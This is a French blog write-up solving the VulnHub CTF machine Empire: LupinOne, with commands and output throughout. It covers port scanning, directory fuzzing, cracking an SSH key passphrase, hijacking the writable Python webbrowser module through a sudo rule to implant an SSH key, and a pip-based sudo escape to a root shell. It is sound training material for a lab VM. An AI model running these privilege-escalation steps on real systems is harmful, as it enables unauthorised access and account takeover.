# Solution du CTF Empire: LupinOne de VulnHub

Le tour des lieux
-----------------

[Empire: LupinOne](https://www.vulnhub.com/entry/empire-lupinone,750/) est un CTF de  *icex64 & Empire Cybersecurity* téléchargeable sur la plateforme *VulnHub*.  

Le nom *Lupin* fait référence à *Arsène Lupin* mais comme vous le verrez par la suite la thématique n'a pas été trop poussée (ça reste un boot2root).  

On commence comme il se doit par le classique scan de ports:  

```plain
sudo nmap -T5 -p- -sC -sV 192.168.2.5 -v -Pn

Nmap scan report for 192.168.2.5
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.48 (Debian)
MAC Address: 08:00:27:19:FC:41 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Il nous reste donc sur les bras un serveur web et un *robots.txt* à la racine nous indiquant de ne pas aller sur */~myfiles* ce qu'on s'empresse évidemment de faire.  

Cette URL nous amène à une page d'erreur 404 qui pourrait sembler légitime si on ne connait pas bien le style habituel des serveurs Apache ou Nginx.  

Dans les commentaires présents dans le code source on peut lire: *Your can do it, keep trying.*.  

La recherche de la porte laissée ouverte
----------------------------------------

Armé même de bonnes wordlists, [feroxbuster](https://github.com/epi052/feroxbuster#readme) ne trouve aucun fichier ni dossier intéressant.  

Le dossier *~myfiles* ne contient rien d'intéressant comme vu précédemment mais laisse supposer qu'on peut trouver d'autres dossiers commençant par un tilde (qui est souvent une convention pour les espaces utilisateurs sous Apache). Patator n'ayant pas été mis à jour depuis un moment je me suis rabattu sur le bien connu [ffuf](https://github.com/ffuf/ffuf#readme) :  

```bash
$ ffuf -u http://192.168.2.5/~FUZZ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.2.5/~FUZZ
 :: Wordlist         : FUZZ: /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

secret                  [Status: 301, Size: 312, Words: 20, Lines: 10]
myfiles                 [Status: 301, Size: 313, Words: 20, Lines: 10]
:: Progress: [119601/119601] :: Job [1/1] :: 7299 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

Ce dossier secret nous amène à une page avec le texte suivant:  

> 
> Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,  
> 
> Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.  
> 
> I'm smart I know that.  
> 
> Any problem let me know  
> 
> **Your best friend icex64**

Guessing
--------

Il y a plusieurs indications possibles ici:  

* On cherche une clé privée ssh. Le nom habituel de ces fichiers est id\_rsa ou id\_dsa
* Le fichier est caché ce qui veut dire à peu près tout et n'importe quoi (dans un dossier au nom improbable, dans une image via stéganographie, etc)
* L'utilisateur a un mot de passe qui peut se trouver dans une wordlist
* La dernière ligne avec le nom d'utilisateur *icex64* est en gras ce qui peut laisser supposer qu'il s'agit du nom d'utilisateur Linux

J'ai commencé par tenter de bruteforcer via SSH (avec Hydra) le compte *icex64* sans succès.  

L'image affichée sur la page d'index du site ne semble contenir aucun tag EXIF utile et une analyse hexadécimale n'a rien révélé non plus.  

Enfin l'utilisation de dictionnaires bien connus pour l'énumération des fichiers et dossiers (raft-large-etc) sur le site n'a mené à rien.  

Il m'aura fallut un indice pour savoir que le mot à rechercher était *mysecret* qui n'était dans aucune de mes wordlists. De plus le fichier était caché dans le sens où il était aussi précédé d'un point et disposait d'une extension *txt* bref autant de détails improbables qui rendent cette partie peu réaliste.  

On aurait pu trouver le fichier avec rockyou de cette façon :  

```bash
$ ffuf -u http://192.168.2.5/~secret/.FUZZ.txt -w /tools/wordlists/rockyou.txt -mc 200
```

Evidemment utiliser ce type de wordlist pour ce type de recherche c'est comme se servir d'un sous marin nucléaire pour débloquer un filtre à huile récalcitrant (et je sais de quoi je parle).  

Décodage
--------

Le fichier obtenu n'est pas dans le format classique d'une clé SSH avec le ascii armor (c'est à dire la ligne BEGIN et la ligne END) mais pour le reste ça ressemble quand même.  

On tente de l'utiliser :  

```plain
$ ssh -i /tmp/icex64.key icex64@192.168.2.5
Load key "/tmp/icex64.key": invalid format
icex64@192.168.2.5's password:
```

Hmmm format invalide mais le client SSH nous demande tout de même la passphrase.  

Il faut utiliser l'utilitaire *ssh2john* qui transforme la clé SSH en un hash sur lequel JtR pourra travailler mais cette fois on obtient une erreur comme quoi le magic est introuvable.  

Intéressant, je ne savais pas que les clés SSH disposaient d'un magic (entête permettant de les reconnaître des autres types de fichier).  

J'ai essayé de reformater correctement la clé en découpant en lignes de taille fixe et en rajoutant préfixe et suffixe mais sans plus de résultat.  

Comme dit précédemment le texte ressemble à une clé SSH donc grosso modo du base64 mais le décoder comme tel donne juste des données qui semblent n'avoir aucun intérêt (pour le coup aucun magic sur le binaire extrait).  

Et si ce n'était pas du base64 ? Si on recherche *detect crypto encoding* sur DuckuckGo on trouve facilement le site [dcode.fr](https://www.dcode.fr/cipher-identifier) (cocorico !) qui lui nous indique après soumission qu'il s'agit d'un encodage en base 58 (et du coup compatible 64).  

Le site dispose d'un décodeur qui cette fois nous retourne la clé privée SSH sous un format bien reconnaissable.  

Pour le coup JtR n'en fait qu'une bouchée :  

```plain
./john  --wordlist=wordlist.txt  hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (/tmp/dcode-data.txt)     
1g 0:00:00:01 DONE (2021-11-19 17:22) 0.6535g/s 20.91p/s 20.91c/s 20.91C/s P@55w0rd..security
```

Intrusion
---------

On arrive alors sur cette machine Linux avec notre compte *icex64* :   

```plain
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux
```

Je m'intéresse tout de suite aux autres utilisateurs, en particulier Arsène :  

```plain
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

```plain
icex64@LupinOne:~$ ls -al /home/arsene
total 40
drwxr-xr-x 3 arsene arsene 4096 Oct  4 18:46 .
drwxr-xr-x 4 root   root   4096 Oct  4 09:15 ..
-rw------- 1 arsene arsene   47 Oct  4 18:47 .bash_history
-rw-r--r-- 1 arsene arsene  220 Oct  4 08:03 .bash_logout
-rw-r--r-- 1 arsene arsene 3526 Oct  4 08:03 .bashrc
-rw-r--r-- 1 arsene arsene  118 Oct  4 14:16 heist.py
drwxr-xr-x 3 arsene arsene 4096 Oct  4 12:37 .local
-rw-r--r-- 1 arsene arsene  339 Oct  4 15:07 note.txt
-rw-r--r-- 1 arsene arsene  807 Oct  4 08:03 .profile
-rw------- 1 arsene arsene   67 Oct  4 14:32 .secret
```

Arsène nous a laissé une note:  

```plain
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.
```

Le code Python *heist.py* n'est pas modifiable par nous. Il ne fait qu'utiliser le module Python webrowser (qui permet d'ouvrir une page web sur votre système avec le navigateur par défaut).  

Du coup je ne suis pas vraiment surpris de retrouver le module parmi la liste des fichiers que je peux modifier :  

```plain

$ find / -writable 2> /dev/null  | grep -v /proc | grep -v /run

--- snip ---
/usr/lib/python3.9/webbrowser.py
--- snip ---

```

Maintenant comment lancer *heist.py* avec les droits d'Arsène ? Tâche planifiée ? En fait l'autorisation est donnée via sudo :  

```bash
$ sudo -l
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

J'ai repris exactement la même méthodologie que pour le précédent CTF à savoir ajouter du code Python qui ajoute ma clé publique aux clés autorisées pour l'utilisateur :  

```python
import os
import stat

os.mkdir("/home/arsene/.ssh")
with open("/home/arsene/.ssh/authorized_keys", "w") as fd:
  fd.write("ssh-rsa --my-public-ssh-key--")

os.chmod("/home/arsene/.ssh/authorized_keys", stat.S_IREAD|stat.S_IWRITE)
```

Trophé
------

Une fois connecté en tant que Arsène ou peut lire le fichier secret :  

```bash
arsene@LupinOne:~$ cat .secret 
I dont like to forget my password "rQ8EE"UK,eV)weg~*nd-`5:{*"j7*Q"
```

Que peut-on faire avec un mot de passe ? Commençons par regarder du côté de sudo:  

```plain
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

L'entrée sudo ce n'est pas très original mais cette fois la commande à exploiter c'est *pip* (le gestionnaire de paquets de Python), ça change :)  

On trouve une astuce permettant d'avoir un shell sur [gtfobins](https://gtfobins.github.io/gtfobins/pip/#shell) :  

```bash
arsene@LupinOne:~$ TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:~$ sudo /usr/bin/pip install $TF
Processing /tmp/tmp.Grss4a5pEc
# id
uid=0(root) gid=0(root) groups=0(root)
```

Et un CTF de plus dans la liste ! De mon point de vue, trop de guessing sur la partie énumération qui n'apportait de plus rien d'intéressant. Le base 58 et l'exploitation de *pip* étaient plus amusantes mais ne requièrent pas de technicité particulière (on aurait pu toutefois chercher nous même à exploiter *pip* via l'écriture et la publication d'un paquet custom).  


*Published November 22 2021 at 22:24*